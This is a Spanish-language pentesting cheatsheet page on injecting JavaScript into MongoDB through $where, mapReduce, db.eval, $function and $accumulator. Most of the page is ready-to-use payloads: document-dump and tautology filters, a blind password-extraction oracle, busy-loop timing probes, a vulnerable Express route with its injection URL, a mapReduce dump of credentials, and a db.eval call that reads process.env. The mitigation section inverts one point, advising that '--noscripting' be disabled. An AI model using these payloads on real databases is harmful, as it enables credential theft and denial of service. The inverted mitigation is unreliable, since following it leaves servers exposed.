---
aliases:
  - NoSQL $where injection
  - MongoDB JS injection
  - mapReduce injection
tags:
  - type/technique
  - vuln/nosqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[NoSQL Injection]]'
---
# NoSQLi - JavaScript ($where, mapReduce)

***

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|---|
| **$where return true** | `{"$where":"return true"}` | Dump todos los docs. |
| **$where custom filter** | `{"$where":"this.role=='admin'"}` | Filtrar por field arbitrario. |
| **$where tautology** | `{"$where":"1==1"}` | Equivalente a return true, simple. |
| **$where extracción blind** | `{"$where":"this.password.startsWith('a')"}` | Boolean oracle por char — ver [[NoSQLi - Extracción Blind]]. |
| **$where time-based (v3.0)** | `{"$where":"sleep(5000) \|\| true"}` | MongoDB ≤3.0 tenía `sleep()`. |
| **$where time-based (moderno)** | `{"$where":"function(){var d=Date.now();while(Date.now()-d<5000){}return true}()"}` | Busy-loop delay para versiones sin `sleep()`. |
| **mapReduce classic (MongoDB ≤4.2)** | `db.users.mapReduce(function(){emit(this._id, this);}, function(k,v){return v;}, {out:"pwn"})` | Dump cross-collection. |
| **db.system.js** | `db.system.js.save({_id:"shell",value:function(){...}})` | Guarda JS server-side para invocación posterior. |
| **$accumulator (MongoDB 4.4+)** | `{"$accumulator":{"init":"function(){return {}}","accumulate":"function(s,v){...}","lang":"js"}}` | JS moderno en aggregation pipeline. |
| **$function (MongoDB 4.4+)** | `{"$function":{"body":"function(){return this.role}","args":[],"lang":"js"}}` | Ejecuta JS arbitrario en pipeline. |
^nosqli-js

___

## Overview

MongoDB permite **ejecutar JavaScript server-side** en varios contextos (con restricciones según versión). Si el backend pasa user input a `$where`, `$function`, `$accumulator` o mapReduce sin sanitizar, el atacante controla código JS ejecutándose en el servidor MongoDB.

### Contextos ejecutables

| Context | Versión | Sandboxing | Riesgo |
|---|---|---|---|
| `$where` | Todas | V8 sin acceso a filesystem/network | Medium — boolean oracle, dump |
| `db.eval` method | ≤4.0 | Ninguno | **High** — JS arbitrario en proc |
| `mapReduce` | Todas (legacy ≤4.2) | Sandbox parcial | Medium — aggregation abuse |
| `$function` | 4.4+ | JS sandboxed, sin `require`, sin Node APIs | Low-Medium |
| `$accumulator` | 4.4+ | Idem `$function` | Low-Medium |

### $where: el más común

Código vulnerable (Express + Mongoose):
```javascript
app.get('/search', (req, res) => {
    User.find({ $where: `this.name == '${req.query.name}'` });
});
```

Payload:
```
GET /search?name=';return true;//
```

Query resultante:
```javascript
this.name == '';return true;//'
```

→ Return true para todos los docs.

### mapReduce (legacy)

Pre-MongoDB 4.2, `mapReduce` se ejecutaba en V8 sin restricción. Vector para:
- Acceso a todos los documents (via `emit`).
- Cross-collection queries.
- Heavy loops → DoS.

```javascript
db.users.mapReduce(
    function() {
        emit(this._id, {
            user: this.username,
            pass: this.password,
            email: this.email
        });
    },
    function(k, v) { return v; },
    { out: { inline: 1 } }
);
```

Post 4.2 Mongo recomienda aggregation pipeline, pero legacy apps aún lo usan.

### db.eval method — legacy

MongoDB ≤4.0 con `db . eval` method habilitado ejecuta JS arbitrario directamente en el servidor:
```javascript
db.eval("function() { return process.env; }");
```

Escalar a RCE del host requiere la versión antigua + exploits específicos (CVE-2019-2389 y similares). Deprecado y eliminado por default en versiones recientes.

### $function / $accumulator (modernos)

MongoDB 4.4+ introdujo `$function` en aggregation pipeline:
```javascript
db.users.aggregate([
    {
        $addFields: {
            computed: {
                $function: {
                    body: "function(user) { return user.username.toUpperCase(); }",
                    args: ["$$ROOT"],
                    lang: "js"
                }
            }
        }
    }
]);
```

Si el backend permite pasar `body` del user → JS arbitrario en DB. Sandbox bloquea `require`, Node APIs, filesystem — pero permite loops (DoS), acceso a fields cross-doc, etc.

### Detección

1. Probar JSON body con `{"$where":"return true"}` → si response = dump completo → vulnerable.
2. Intentar timing: `{"$where":"function(){var d=Date.now();while(Date.now()-d<5000){}return true}()"}` → 5s delay = ejecuta JS.
3. Check version del target: `db.version()` vía fingerprinting → versiones ≤4.0 más riesgo.

### Mitigación defender

- Desactivar `--noscripting` en MongoDB server.
- Usar parametrized queries en ORMs (Mongoose schemas, TypeORM).
- WAF con reglas para `$where`, `$function`, `$accumulator`, `mapReduce` en request body.

***
